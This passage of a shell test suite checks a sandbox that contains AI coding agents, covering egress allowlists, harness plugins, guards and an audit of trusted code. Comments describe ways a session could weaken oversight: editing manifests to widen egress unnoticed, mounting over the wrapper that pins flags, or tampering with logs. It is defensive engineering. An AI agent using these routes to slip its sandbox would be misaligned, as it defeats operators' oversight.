    grep -q -- 'dejima-allow --project' "$REPO_ROOT/bin/dejima-provider-lib.sh"
}

@test "the agent briefing and the context hook use the new argument order" {
    # A briefing that hands the operator a command the CLI now rejects is worse
    # than one that says nothing.
    run grep -nE 'dejima-allow [a-z<][^ ]* +--' \
        "$REPO_ROOT/bin/dejima-provider-lib.sh" "$REPO_ROOT/hooks/sandbox-context.sh"
    [ "$status" -ne 0 ]
}

@test "the briefing's container placeholder is the template form, not a shell variable" {
    # _briefing_core_preamble is a quoted heredoc rendered by placeholder
    # substitution; a literal $container_id would reach the agent unexpanded.
    run grep -n 'dejima-allow --container \$container_id' "$REPO_ROOT/bin/dejima-provider-lib.sh"
    [ "$status" -ne 0 ]
    grep -q 'dejima-allow --container {{container_id}}' "$REPO_ROOT/bin/dejima-provider-lib.sh"
}

@test "README documents dejima-allow with flags before the domain" {
    grep -q 'dejima-allow --global crates.io' "$REPO_ROOT/README.md"
    run grep -nE 'dejima-allow [a-z][^ ]* +--(global|project)' "$REPO_ROOT/README.md"
    [ "$status" -ne 0 ]
}

@test "README documents dejima-dep with flags before the spec" {
    grep -q 'dejima-dep add --global cargo:cargo-nextest' "$REPO_ROOT/README.md"
    run grep -nE 'dejima-dep (add|remove) [a-z][^ ]* +--(global|project)' "$REPO_ROOT/README.md"
    [ "$status" -ne 0 ]
}

@test "README does not claim --global/--project patch a running session" {
    # A scope-flag-only call sets session_wanted=0 and never touches docker -
    # see bin/dejima-allow. Claiming otherwise sends an operator to expect a
    # live update they will not get.
    run grep -nE 'which also (updates|patches) the running session' "$REPO_ROOT/README.md"
    [ "$status" -ne 0 ]
    grep -q 'deliberately do not touch a running container' "$REPO_ROOT/README.md"
}

@test "README does not claim dejima-project approve reports live-session failures" {
    # approve only ever calls dejima-allow without --container (see
    # bin/dejima-project's approve case), so a failure there is a persistence
    # failure, never a live-session one.
    run grep -n 'could not apply to a running session' "$REPO_ROOT/README.md"
    [ "$status" -ne 0 ]
    grep -q 'never attempts to patch a running session' "$REPO_ROOT/README.md"
}

@test "README does not attribute container disambiguation to a scope flag" {
    # A --project/--global-only call sets session_wanted=0 and never reaches
    # the multiple-containers ambiguity check at all - only the bare form
    # (or bare + --container) does. Only the bare form can ever refuse on it.
    run grep -n 'scope-flag) form\|scope-flag form' "$REPO_ROOT/README.md"
    [ "$status" -ne 0 ]
}

@test "the docs say the harness must be signed in on the host first" {
    # dejima authenticates nothing: the proxy holds a credential the harness
    # wrote on the host. Without one, a session starts normally and then
    # cannot reach the model, which reads as a dejima fault. Nothing enforces
    # the prerequisite, so it has to be stated where someone setting up will
    # meet it.
    grep -q '^## Sign in on the host first' "$REPO_ROOT/README.md"
    sed -n '/^### Core (required)/,/^That is enough to run/p' "$REPO_ROOT/README.md" \
        | tr '\n' ' ' | tr -d '*`' | tr -s ' ' | grep -qi 'sign in to it there'
    grep -q 'Sign in on the host first' "$REPO_ROOT/docs/security.md"
}

@test "every statement that an escape defeats everything says what bounds the next layer" {
    # True as far as it goes, and it used to stop there. What an escape
    # reaches is a layer dejima cannot bound because it runs inside it, and
    # a reader left at "defeats all of it" has no idea there is a project
    # for exactly that.
    local f
    for f in README.md SECURITY.md docs/security.md docs/responsible-use.md; do
        grep -qi 'escape' "$REPO_ROOT/$f" || continue
        grep -q 'dejima-devbox-hardener' "$REPO_ROOT/$f" \
            || { echo "$f describes an escape without naming what bounds it"; return 1; }
    done
}

# --- harness plugins: a plugin computes, core enforces ---

@test "no harness plugin touches the mount list directly" {
    # A plugin that appended to extra_mounts itself would skip the
    # guarded-store refusal emit_mount runs at the point of declaration -
    # and would skip it differently in each harness, which is how one
    # security model becomes one per harness. The plugins are trusted code,
    # so this is held at review time rather than by isolating them.
    run grep -rn 'extra_mounts' "$REPO_ROOT/bin/harness"
    [ "$status" -ne 0 ] || { echo "a plugin bypasses emit_mount:"; echo "$output"; return 1; }
}

@test "a harness plugin defines only hooks core actually calls" {
    # A function named something core never calls looks wired up and is
    # dead. Worse, a near-miss of a real hook name (harness_state_mount for
    # harness_state_mounts) reads as implemented and silently does nothing.
    local hooks f fn
    hooks="$(sed -n 's/^DEJIMA_HARNESS_HOOKS="\(.*\)"$/\1/p' \
        "$REPO_ROOT/bin/dejima-harness-lib.sh")"
    [ -n "$hooks" ] || { echo "the hook list is gone"; return 1; }
    for f in "$REPO_ROOT"/bin/harness/*.sh; do
        [ -f "$f" ] || continue
        while IFS= read -r fn; do
            [ -n "$fn" ] || continue
            # A leading underscore is the plugin's own helper, and says so.
            # The check that matters is the near-miss - harness_state_mount
            # for harness_state_mounts - and a name that does not even claim
            # to be a hook cannot be one of those.
            case "$fn" in _*) continue ;; esac
            case " $hooks " in
                *" $fn "*) ;;
                *) echo "$(basename "$f") defines $fn, which core never calls"; return 1 ;;
            esac
        done < <(grep -oE '^[a-zA-Z_][a-zA-Z0-9_]*\(\)' "$f" | sed 's/()$//')
    done
}

@test "every shipped harness has both a manifest and a plugin" {
    # Support is per harness and deliberate. A manifest with no plugin is a
    # half-finished integration that would present as a supported harness.
    local d name
    for d in "$REPO_ROOT"/harnesses/*/; do
        [ -d "$d" ] || continue
        name="$(basename "$d")"
        [ -f "$d/harness.conf" ] || { echo "$name has no manifest"; return 1; }
        [ -f "$REPO_ROOT/bin/harness/$name.sh" ] \
            || { echo "$name has a manifest but no plugin"; return 1; }
    done
    for d in "$REPO_ROOT"/bin/harness/*.sh; do
        [ -f "$d" ] || continue
        name="$(basename "$d" .sh)"
        [ -f "$REPO_ROOT/harnesses/$name/harness.conf" ] \
            || { echo "$name has a plugin but no manifest"; return 1; }
    done
}

@test "harness plugins are inside the trusted computing base the audit watches" {
    # They run on the host, in the launch path. Under harnesses/ they would
    # be host-executed code a session could edit in dejima's own checkout
    # without raising a CRITICAL, because tcb_snapshot covers install.sh,
    # bin/, hooks/, docker/ and test/ - and not the provider directories.
    [ -d "$REPO_ROOT/bin/harness" ] || { echo "plugins are not under bin/"; return 1; }
    run grep -rn 'harness_state_mounts\|harness_plugin_load' "$REPO_ROOT/harnesses"
    [ "$status" -ne 0 ] || { echo "plugin code under harnesses/:"; echo "$output"; return 1; }
    sed -n '/^tcb_snapshot()/,/^}/p' "$REPO_ROOT/bin/dejima-audit" | grep -q 'for dir in bin '
}

# --- the wrapper is the harness's, not Claude Code's ---

@test "the wrapper names no harness, and the image installs it under a neutral name" {
    # It is shadowed into place under the harness's own command by
    # entrypoint.sh, because the image is shared across harnesses and the
    # selection is per launch. A COPY to a fixed name would bake one
    # harness's command into every image.
    local w="$SANDBOX_DIR/harness-wrapper.sh"
    [ -f "$w" ] || { echo "the generic wrapper is gone"; return 1; }
    run grep -niE 'claude|anthropic' "$w"
    [ "$status" -ne 0 ] || { echo "the shared wrapper names a harness:"; echo "$output"; return 1; }
    grep -q 'COPY docker/harness-wrapper.sh /usr/local/bin/dejima-harness-wrapper' \
        "$SANDBOX_DIR/Dockerfile"
    run grep -n 'COPY docker/claude-wrapper' "$SANDBOX_DIR/Dockerfile"
    [ "$status" -ne 0 ] || { echo "the old fixed-name copy is back"; return 1; }
}

@test "the wrapper's directory beats the one npm installs the real binary into" {
    # The wrapper shadows the harness's real binary to pin
    # --dangerously-skip-permissions, --settings and the briefing. That binary
    # is npm-installed, so if the npm prefix comes first on PATH it wins and
    # every one of those flags is dropped - silently, leaving a session that
    # asks permission for everything and gets no briefing.
    #
    # It shipped that way once: moving the npm prefix carried a prepend over
    # from elsewhere, and nothing here noticed.
    local prefix
    prefix=$(sed -n 's/^ENV NPM_CONFIG_PREFIX=//p' "$SANDBOX_DIR/Dockerfile")
    [ -n "$prefix" ] || { echo "no npm prefix is set"; return 1; }

    local line
    while IFS= read -r line; do
        case "$line" in
            *"$prefix/bin:\$PATH"*)
                echo "the npm prefix is prepended, so it shadows the wrapper: $line"
                return 1 ;;
        esac
    done < <(grep -h -- "$prefix/bin" "$SANDBOX_DIR/Dockerfile" "$SANDBOX_DIR/session-bashrc.sh")

    grep -q 'COPY docker/harness-wrapper.sh /usr/local/bin/dejima-harness-wrapper' "$SANDBOX_DIR/Dockerfile" \
        || { echo "the wrapper is not installed in /usr/local/bin"; return 1; }
}

@test "the entrypoint refuses a harness command name that is not a bare name" {
    # It becomes a path under /usr/local/bin. A value with a slash would
    # write the symlink somewhere else entirely, and this one arrives from
    # the host as an environment variable.
    sed -n '/SANDBOX_HARNESS_COMMAND:-/,/^fi/p' "$SANDBOX_DIR/entrypoint.sh" \
        | grep -q '\*/\*'
}

@test "the no-confirm flags come from the harness manifest" {
    # R1 of the capability bar. The flag was hardcoded in the wrapper, which
    # made unattended operation a property of the image rather than of the
    # selected harness.
    grep -qE -- 'no_confirm_args\s*=\s*--dangerously-skip-permissions' \
        "$REPO_ROOT/harnesses/claude-code/harness.conf"
    grep -q 'no_confirm_args' "$REPO_ROOT/bin/dejima"
    # And a harness that names none is refused rather than run asking for
    # confirmation on every tool call, which presents as a hang.
    grep -q 'declares no no_confirm_args' "$REPO_ROOT/bin/dejima"
}

@test "core's schema holds no harness's command as a default" {
    # [core] command defaulted to the literal `claude`, so core carried one
    # harness's command name while the manifest's own `command` key was read
    # by nothing.
    run grep -nE '^core\.command\s+identifier\s+claude' "$REPO_ROOT/bin/dejima-config-lib.sh"
    [ "$status" -ne 0 ] || { echo "core still defaults to a harness command"; return 1; }
    grep -qE '^core\.command\s+\?identifier' "$REPO_ROOT/bin/dejima-config-lib.sh"
    grep -q 'SANDBOX_CMD="$SANDBOX_HARNESS_COMMAND"' "$REPO_ROOT/bin/dejima"
}

# --- guards are declared, not assumed ---

@test "every shipped harness declares which guards it can host" {
    # An absent `guards` reads as "hosts none", which for a harness that
    # hosts all four would tell the operator at every launch that four
    # protections are missing. Silence is not a valid declaration here.
    local d name g known
    known="$(sed -n 's/^DEJIMA_KNOWN_GUARDS="\(.*\)"$/\1/p' "$REPO_ROOT/bin/dejima-provider-lib.sh")"
    [ -n "$known" ] || { echo "the known-guard set is gone"; return 1; }
    for d in "$REPO_ROOT"/harnesses/*/; do
        [ -f "$d/harness.conf" ] || continue
        name="$(basename "$d")"
        grep -qE '^\s*guards\s*=' "$d/harness.conf" \
            || { echo "$name declares no guards"; return 1; }
        for g in $(sed -n 's/^\s*guards\s*=\s*//p' "$d/harness.conf"); do
            case " $known " in
                *" $g "*) ;;
                *) echo "$name declares unknown guard: $g"; return 1 ;;
            esac
        done
    done
}

@test "the guard set core knows lives with the validation that rejects a name" {
    # It was in dejima-harness-lib.sh while provider_validate_selection read
    # it from dejima-provider-lib.sh, so a caller loading only the latter -
    # providers.bats does - validated against an empty set and rejected
    # every guard there is.
    grep -q '^DEJIMA_KNOWN_GUARDS=' "$REPO_ROOT/bin/dejima-provider-lib.sh"
    run grep -n '^DEJIMA_KNOWN_GUARDS=' "$REPO_ROOT/bin/dejima-harness-lib.sh"
    [ "$status" -ne 0 ] || { echo "the set is defined in two places"; return 1; }
}

@test "core gates guard work on the declaration, not on the plugin defining a hook" {
    # A harness that forgot the declaration but implemented the hook would
    # get a guard the launch message has just said it does not have.
    grep -q 'harness_has_guard notify' "$REPO_ROOT/bin/dejima"
}

@test "install.sh installs no harness's hooks itself" {
    # Where dejima's guards go, and in what shape, is the selected harness's
    # business. install.sh knowing ~/.claude/settings.json's schema is the
    # coupling; it delegates to the harness's plugin now.
    run grep -nE '\.claude/(settings\.json|hooks)' "$REPO_ROOT/install.sh"
    [ "$status" -ne 0 ] || { echo "install.sh still writes a harness's config:"; echo "$output"; return 1; }
    grep -q 'harness_register_guards' "$REPO_ROOT/install.sh"
    grep -q '^harness_register_guards()' "$REPO_ROOT/bin/harness/claude-code.sh"
}

@test "the plugin loader does not depend on its caller's SCRIPT_DIR" {
    # bin/dejima sets it to bin/ and install.sh sets it to the repo root. A
    # library that resolves paths from one of those only works for one of
    # its callers.
    sed -n '/^harness_plugin_load()/,/^}/p' "$REPO_ROOT/bin/dejima-harness-lib.sh" \
        | grep -q 'BASH_SOURCE'
    run sed -n '/^harness_plugin_load()/,/^}/p' "$REPO_ROOT/bin/dejima-harness-lib.sh"
    [[ "$output" != *'$SCRIPT_DIR'* ]] || { echo "$output"; return 1; }
}

@test "a finding's label lives in trusted code, never in a manifest" {
    # `ack` recovers an id by stripping a fixed label from the front of a
    # finding. Those labels are a parser's grammar, and provider directories
    # are not in tcb_snapshot's list - in the self-mount case a session can
    # edit a manifest without raising a CRITICAL. So the label stays a
    # literal in code the audit does watch, which is why host-exec surfaces
    # are a plugin hook rather than a manifest key.
    grep -q 'HOST-CODE-EXECUTION' "$REPO_ROOT/bin/harness/claude-code.sh"
    run grep -rn 'HOST-CODE-EXECUTION' "$REPO_ROOT/harnesses"
    [ "$status" -ne 0 ] || { echo "a finding label is manifest data:"; echo "$output"; return 1; }
    run grep -rniE 'host_exec_paths|host_exec_label' "$REPO_ROOT/harnesses" "$REPO_ROOT/bin/dejima-provider-lib.sh"
    [ "$status" -ne 0 ] || { echo "host-exec surfaces leaked into the manifest schema:"; echo "$output"; return 1; }
}

@test "the audit resolves host-execution paths from the harness, not a hardcoded one" {
    run grep -n 'STATUSLINE_PATH' "$REPO_ROOT/bin/dejima-audit"
    [ "$status" -ne 0 ] || { echo "$output"; return 1; }
    grep -q 'host_exec_load' "$REPO_ROOT/bin/dejima-audit"
    grep -q '^harness_host_exec_surfaces()' "$REPO_ROOT/bin/harness/claude-code.sh"
}

@test "the provider directories are in the audit's TCB list" {
    # They hold no code, which is why they were left out. What they hold
    # decides what the next launch permits: a forge's fixed_hosts reaches
    # DEJIMA_FORGE_HOSTS, which entrypoint.sh joins into the domains
    # the egress policy permits, so a manifest line widens the egress
    # boundary on the next run. A briefing fragment is what the next session
    # is told it may do.
    local dirs
    dirs="$(sed -n '/^tcb_snapshot()/,/^}/p' "$REPO_ROOT/bin/dejima-audit" \
        | sed -n 's/.*for dir in \(.*\); do/\1/p')"
    [ -n "$dirs" ] || { echo "the TCB directory list is gone"; return 1; }
    local d
    for d in bin hooks docker test forges workflows harnesses; do
        case " $dirs " in
            *" $d "*) ;;
            *) echo "$d is not in the TCB list: $dirs"; return 1 ;;
        esac
    done
}

@test "the transcript format is the harness's, the store is dejima's" {
    # What a compaction looks like in a transcript is a fact about the
    # harness; where the summary is kept, that nothing mounts it, and what
    # the file promises about its own provenance are dejima's.
    grep -q 'isCompactSummary' "$REPO_ROOT/bin/harness/claude-code.sh"
    run grep -n 'isCompactSummary\|compact_boundary\|\.jsonl' "$REPO_ROOT/bin/dejima-epitaph"
    [ "$status" -ne 0 ] || { echo "the transcript format is still in core:"; echo "$output"; return 1; }
    # The provenance note is dejima's promise about the artefact, so it is
    # defined once rather than phrased per harness.
    grep -q '^DEJIMA_EPITAPH_NOTE=' "$REPO_ROOT/bin/dejima-harness-lib.sh"
    run grep -c 'preserved verbatim' "$REPO_ROOT/bin/harness/claude-code.sh"
    [ "$output" -eq 0 ] || { echo "a plugin phrases the provenance note itself"; return 1; }
}

@test "transcripts are resolved by slug, not by matching a prefix" {
    # A "<slug>-*" glob picks up this workspace's worktrees and also a
    # SIBLING project whose directory name merely extends its own (#105).
    # Every project's directory is present on the host, so nothing else
    # would catch the neighbour's conversation being shipped.
    #
    # In the plugin now rather than in the shipper, because which directories
    # hold transcripts is the harness's answer - but the property is the same
    # one and has to keep holding wherever it lives.
    grep -q 'workspace_slugs_sorted "$ws"' "$REPO_ROOT/bin/harness/claude-code.sh"
    local f
    for f in bin/dejima-conversation-ship bin/harness/claude-code.sh; do
        run grep -nE '\$slug-\*|\$\{slug\}-\*|\$key-\*' "$REPO_ROOT/$f"
        [ "$status" -ne 0 ] || { echo "prefix matching is back in $f:"; echo "$output"; return 1; }
    done
}

@test "neither transcript tool knows a harness's directory layout" {
    # The decoupling itself. Where transcripts are, what they are called and
    # how they are nested are all the harness's; a second harness keys its
    # transcripts by session id under a per-project directory and shares none
    # of Claude Code's shape. What the two tools keep is the store, the
    # batching, the Loki push and the slug rule.
    local f pat
    for f in bin/dejima-epitaph bin/dejima-conversation-ship; do
        for pat in 'projects_dir' '\.jsonl' 'messages\.json' '/sessions/'; do
            run grep -nE "$pat" "$REPO_ROOT/$f"
            [ "$status" -ne 0 ] \
                || { echo "$f still knows a harness layout ($pat):"; echo "$output"; return 1; }
        done
    done
    # And each tool asks for it instead.
    grep -q 'harness_transcript_files' "$REPO_ROOT/bin/dejima-epitaph"
    grep -q 'harness_transcript_files' "$REPO_ROOT/bin/dejima-conversation-ship"
}

@test "a transcript key that is not this workspace's slug is refused" {
    # The key decides which project's epitaphs a transcript is filed under, so
    # a plugin that computed one wrong would write into another project's
    # history - the shape of #104. Core checks rather than trusting, which is
    # the rule the whole plugin interface is built on.
    #
    # Asserted on the source: driving it needs a plugin that returns a bad key,
    # and the only way to load one is to add a file under bin/harness/, which
    # would be a real harness as far as every other test is concerned.
    grep -q 'own_slug' "$REPO_ROOT/bin/dejima-epitaph"
    grep -q 'a slug of this workspace' "$REPO_ROOT/bin/dejima-epitaph"
}

@test "the two transcript update models are declared, not sniffed" {
    # Append semantics against a rewritten file ship the middle of a JSON
    # document. Getting it wrong is not subtle, so it is a manifest value
    # rather than something guessed from the bytes at runtime.
    run bash -c 'source "$1"; _manifest_table harness' _ "$REPO_ROOT/bin/dejima-provider-lib.sh"
    [[ "$output" == *"transcript_update"* ]] || { echo "no such manifest key"; return 1; }
    grep -q 'MODE=' "$REPO_ROOT/bin/dejima-conversation-ship"
    local name
    while IFS= read -r name; do
        [ -n "$name" ] || continue
        run lib manifest_get harness "$name" transcript_update
        [[ "$output" == "append" || "$output" == "rewrite" ]] \
            || { echo "$name declares transcript_update='$output'"; return 1; }
    done < <(lib provider_list harness)
}


@test "the container's log shipper reads nothing the session writes" {
    # It runs as root, for tamper-resistance: an oversight log the surveilled
    # user owns is one they can edit. That privilege is only safe while what it
    # parses is not session-writable, which is what this holds - the two
    # records the policy produces, both written by daemons in the filter
    # container, which the session has no way to reach.
    # Non-comment lines only: the comment there says where conversation
    # shipping went, which is worth keeping.
    run bash -c "grep -vE '^[[:space:]]*#' '$SANDBOX_DIR/log-shipper.sh' | grep -nE 'projects|[.]jsonl|transcript'"
    [ "$status" -ne 0 ] || { echo "$output"; return 1; }
    # Both streams come from the directory the policy owns, in the container
    # the session is not in.
    run bash -c "grep -E '^ship_stream ' '$SANDBOX_DIR/log-shipper.sh'"
    [ "$status" -eq 0 ]
    local line
    while read -r line; do
        [ -n "$line" ] || continue
        grep -q '/var/log/egress-policy/' <<< "$line" \
            || { echo "a stream reads outside the policy's own log directory: $line"; return 1; }
    done <<< "$output"
    # And the claim that makes root safe, where the shipper is now started.
    grep -q 'tamper-resistance' "$SANDBOX_DIR/firewall-up.sh" \
        || { echo "firewall-up.sh no longer says why the shipper keeps root"; return 1; }
}

@test ".dejima.md says to cut what the code replaced, not just how it was found" {
    # "Cut how you found it" is about the discovery - which CI run, how many
    # attempts. Describing the arrangement a change replaced is a different
    # habit, and the "keep why it is shaped this way" rule invites it: a
    # previous shape is the easiest answer to that question. Both have to be
    # written down or the second keeps coming back.
    local sec
    sec="$(sed -n '/^## Write the comment that prevents the bug/,/^## /p' "$REPO_ROOT/.dejima.md")"
    grep -q 'Cut how you found it' <<< "$sec"
    grep -q 'Cut what the code replaced' <<< "$sec" \
        || { echo "the rule about a previous arrangement is gone"; return 1; }
    # And the exception, or the next pass strips the comments that exist
    # only to explain code whose purpose is the past.
    grep -qi 'exception' <<< "$sec" \
        || { echo "the rename/shim exception is gone"; return 1; }
}

# emit_mount_at is exercised directly rather than through a launch: the two
# checks below are pure path logic, and a plugin that emitted a bad target
# could only be introduced by writing one into the checkout.
_emit_mount_at() {
    bash -c '
        source "'"$REPO_ROOT"'/bin/dejima-harness-lib.sh"
        extra_mounts=()
        _guarded_stores() { GUARDED_STORES=(); }
        _refuse_guarded_mount() { :; }
        emit_mount_at "$@" || exit $?
        printf "%s\n" "${extra_mounts[@]}"
    ' _ "$@"
}

@test "a harness mount may name a container path different from its source" {
    # For a harness whose own keying dejima cannot safely follow: the source
    # stays keyed by something the session cannot change, and only the target
    # follows the harness.
    run _emit_mount_at /host/state /container/state
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" == *"/host/state:/container/state"* ]] || { echo "$output"; return 1; }
    run _emit_mount_at /host/state /container/state ro
    [[ "$output" == *"/host/state:/container/state:ro"* ]] || { echo "$output"; return 1; }
}

@test "a harness mount is refused when its target shadows something the sandbox needs" {
    # The wrapper that pins the no-confirm flags, the settings layer the
    # guards are registered in, the briefing, the marker directory: a mount
    # landing on any of them replaces it.
    local p
    for p in /usr/local/bin /usr/local/bin/claude /etc/dejima-harness \
             /etc/dejima-settings.json /run/dejima-notify /; do
        run _emit_mount_at /host/state "$p"
        [ "$status" -ne 0 ] || { echo "accepted a mount over $p: $output"; return 1; }
        [[ "$output" == *"Refusing harness mount"* ]] || { echo "$p: $output"; return 1; }
    done
}

@test "a harness mount target must be absolute and free of the mount separator" {
    run _emit_mount_at /host/state relative/path
    [ "$status" -ne 0 ] || { echo "$output"; return 1; }
    [[ "$output" == *"relative mount target"* ]] || { echo "$output"; return 1; }
    run _emit_mount_at /host/state "/has:colon"
    [ "$status" -ne 0 ] || { echo "$output"; return 1; }
    [[ "$output" == *"containing a colon"* ]] || { echo "$output"; return 1; }
}


@test "the harness domain list splits the same for both consumers of it" {
    # firewall-up.sh sources fixed-domains.sh in the container and
    # bin/dejima-allow sources it on the host, under whatever IFS each happens
    # to have - so an unquoted expansion hands them different lists from one
    # value, which is the drift that shared file exists to prevent. The
    # single-domain real manifest cannot show it, which is why this uses two.
    local two="a.example.com b.example.com" n_strict n_default
    n_strict="$(bash -c "IFS=\$'\\n\\t'; SANDBOX_HARNESS_DOMAINS='$two'
        source '$SANDBOX_DIR/fixed-domains.sh'; echo \${#DEJIMA_OPEN_CLASS[@]}")"
    n_default="$(bash -c "SANDBOX_HARNESS_DOMAINS='$two'
        source '$SANDBOX_DIR/fixed-domains.sh'; echo \${#DEJIMA_OPEN_CLASS[@]}")"
    [ "$n_strict" = "$n_default" ] \
        || { echo "one consumer sees $n_strict entries, the other $n_default"; return 1; }
    # And both as separate names, not one glued element that would be permitted
    # as a single nonsense destination and fail the startup check.
    run bash -c "IFS=\$'\\n\\t'; SANDBOX_HARNESS_DOMAINS='$two'
        source '$SANDBOX_DIR/fixed-domains.sh'; printf '%s\n' \"\${DEJIMA_OPEN_CLASS[@]}\""
    grep -qx 'a.example.com' <<< "$output" || { echo "$output"; return 1; }
    grep -qx 'b.example.com' <<< "$output" || { echo "$output"; return 1; }
}

@test "the docs name the staging path the entrypoint actually uses" {
    # A static test already holds entrypoint.sh to the current name; nothing
    # held the docs, so they kept the old one after the rename.
    run grep -rn 'dejima-claude' "$REPO_ROOT/docs" "$SANDBOX_DIR/docker-compose.yml"
    [ "$status" -ne 0 ] || { echo "$output"; return 1; }
    grep -q 'etc/dejima-harness' "$REPO_ROOT/docs/security.md"
}

@test "docs/providers.md lists the whole briefing placeholder whitelist" {
    # The list is what a fragment author checks a placeholder against, so one
    # missing name reads as "not available" for something that is.
    local ph
    for ph in $(sed -n 's/^_BRIEFING_WHITELIST="\(.*\)"$/\1/p' \
                "$REPO_ROOT/bin/dejima-provider-lib.sh"); do
        grep -q "\`$ph\`" "$REPO_ROOT/docs/providers.md" \
            || { echo "$ph is in the whitelist but not documented"; return 1; }
    done
}

@test "the tmux prefix the config accepts is one the page can parse" {
    # `C-space` passed the schema and was then rejected on the page, which
    # fell back to C-b silently - the outcome refusing at launch exists to
    # prevent. Both sides accept a named key in any case now.
    grep -qE "charAt\(0\)\.toUpperCase" "$REPO_ROOT/web/src/keys.js"
    grep -q 'Ss.pace' "$REPO_ROOT/bin/dejima-config-lib.sh"
}

@test "every supported harness is available to a session working on dejima" {
    # A harness dejima claims to support and cannot run here is one whose
    # guards are asserted rather than observed. claude-code is installed in
    # the image; the rest are declared as dependencies of this project.
    local d name
    for d in "$REPO_ROOT"/harnesses/*/; do
        [ -d "$d" ] || continue
        name="$(basename "$d")"
        [ "$name" = "claude-code" ] && continue
        grep -qE "^[a-z]+:.*$name" "$REPO_ROOT/.dejima/dependencies" \
            || { echo "$name is supported but not declared in .dejima/dependencies"; return 1; }
    done
}

# The base image is shared by every project on the host. A harness baked into
# it is carried by every sandbox whether or not it is the one selected, and a
# second harness could only ever be added alongside the first rather than
# chosen between.
@test "the base image installs no harness" {
    run grep -nE 'npm install -g .*(claude-code|opencode|aider)' "$SANDBOX_DIR/Dockerfile"
    [ "$status" -ne 0 ] || { echo "the Dockerfile still bakes in a harness:"; echo "$output"; return 1; }
    # And no build arg pinning one, which is the shape it had.
    run grep -nE '^ARG .*(CLAUDE|HARNESS).*VERSION' "$SANDBOX_DIR/Dockerfile"
    [ "$status" -ne 0 ] || { echo "$output"; return 1; }
    # The Dockerfile says where the harness went, so the absence reads as a
    # decision rather than as something dropped.
    grep -qi 'harness' "$SANDBOX_DIR/Dockerfile"
}

@test "the harness layer is keyed on the harness, and built under the dependency layers" {
    local f="$REPO_ROOT/bin/dejima"
    # Keyed on the name: switching [core] harness has to switch images, not
    # add to one.
    grep -q '${SANDBOX_IMAGE_REPO}:${SANDBOX_USER}-harness-${DEJIMA_HARNESS_NAME}' "$f" \
        || { echo "the harness layer's tag does not name the harness"; return 1; }
    # Below the dependency layers, so a project's own packages sit on top of
    # the harness rather than being invalidated whenever it changes.
    local harness_at global_at
    harness_at=$(grep -n 'SANDBOX_USER}-harness-' "$f" | head -1 | cut -d: -f1)
    global_at=$(grep -n 'build_dep_layer "${SANDBOX_IMAGE_REPO}:${SANDBOX_USER}-global"' "$f" | head -1 | cut -d: -f1)
    [ -n "$harness_at" ] && [ -n "$global_at" ] || { echo "could not locate both layers"; return 1; }
    [ "$harness_at" -lt "$global_at" ] \
        || { echo "the harness layer is built after the dependency layers"; return 1; }
}

@test "the harness install spec is validated before it reaches a RUN line" {
    # It is manifest data and the manifest is dejima's own, but the provider
    # directories are session-writable when dejima sandboxes its own checkout,
    # and this string is interpolated into a Dockerfile built on the host.
    #
    # The schema types it, so every read goes through the validator - which is
    # why bin/dejima does not check it a second time. Pinned as the type,
    # since a manifest key that quietly became a bare string would still read
    # correctly at every call site.
    run bash -c 'source "$1"; _manifest_type harness install' _ \
        "$REPO_ROOT/bin/dejima-provider-lib.sh"
    [ "$status" -eq 0 ] || { echo "the harness schema has no install key"; return 1; }
    [ "$output" = "?depspec" ] \
        || { echo "install is typed '$output', not a dependency spec"; return 1; }
    # And that the type actually delegates to the shared validator, rather
    # than growing a second grammar that could drift from the approval one.
    grep -A 6 'depspec)' "$REPO_ROOT/bin/dejima-provider-lib.sh" | grep -q 'valid_dep_spec' \
        || { echo "the depspec type does not use valid_dep_spec"; return 1; }
}

# docs/development.md's inventory is the document a second harness is built
# from, so a row that has stopped being true is worse than a missing one: it
# sends someone to a file to change something that is not there. These pin the
# claims that this branch made false once already.
@test "the harness inventory does not describe an install the Dockerfile stopped doing" {
    local doc="$REPO_ROOT/docs/development.md"
    # The inventory named a RUN line and a build arg, both gone.
    run grep -nE 'npm install -g .*claude-code|CLAUDE_CODE_VERSION' "$doc"
    [ "$status" -ne 0 ] || { echo "the inventory describes an install that is gone:"; echo "$output"; return 1; }
    # And the file list said the base image carries the harness.
    run grep -nE '^\| `docker/Dockerfile` \|.*[Cc]laude' "$doc"
    [ "$status" -ne 0 ] || { echo "the file list still puts a harness in the base image:"; echo "$output"; return 1; }
}

@test "every Claude Code path the base image still names has an inventory row" {
    # The inventory claims to be complete. Two things in the Dockerfile are
    # written against this harness by name; if a third appears, it needs a row
    # rather than passing unnoticed because the table looks thorough.
    local doc="$REPO_ROOT/docs/development.md"
    local dockerfile="$SANDBOX_DIR/Dockerfile"
    # Lines of actual instruction, not comments.
    run grep -nE '^[^#]*(\.claude|CLAUDE_CODE)' "$dockerfile"
    [ "$status" -ne 0 ] \
        || { echo "the base image is back to naming a harness:"; echo "$output"; return 1; }
    # A row for each, naming where it is satisfied now.
    grep -q 'State directories' "$doc" || { echo "no inventory row for the state directories"; return 1; }
    grep -q 'Image environment' "$doc" || { echo "no inventory row for the image environment"; return 1; }
    grep -q 'Proxied endpoint' "$doc" || { echo "no inventory row for the proxied domain"; return 1; }
}

@test "every file the docs' file list names exists, and the libraries are all in it" {
    local doc="$REPO_ROOT/docs/development.md" f missing=""
    # The Files table only - the manifest key tables further down use the same
    # row shape for things that are not paths.
    while IFS= read -r f; do
        case "$f" in */|*'<'*|*'*'*) continue ;; esac
        [ -e "$REPO_ROOT/$f" ] || missing="$missing $f"
    done < <(sed -n '/^## Files/,/^## /p' "$doc" | grep -oP '(?<=^\| `)[^`]+')
    [ -z "$missing" ] || { echo "the file list names files that do not exist:$missing"; return 1; }
    # And the other direction for the shared libraries, which are the entries
    # most easily forgotten because nothing puts them on PATH.
    for f in bin/dejima-config-lib.sh bin/dejima-color-lib.sh bin/dejima-provider-lib.sh \
             bin/dejima-harness-lib.sh bin/dejima-tui-lib.sh docker/install-forge-bins.sh; do
        grep -q "\`$f\`" "$doc" || { echo "$f is shipped but not in the file list"; return 1; }
    done
}

# The base image is shared by every harness. Anything in it that only one
# harness needs is that harness imposed on every image dejima builds, and
# makes "add a second harness" mean "add to the first one's image".
@test "the base image names no harness's state directories or environment" {
    local d="$SANDBOX_DIR/Dockerfile"
    # Instruction lines only: a comment may name a harness as an example of a
    # general rule, and several do.
    run grep -nE '^[^#]*(\.claude|CLAUDE_CODE|\.aider|\.opencode)' "$d"
    [ "$status" -ne 0 ] || { echo "the base image names a harness's paths:"; echo "$output"; return 1; }
    # .ssh still is the base image's own, so the mkdir it shares has not
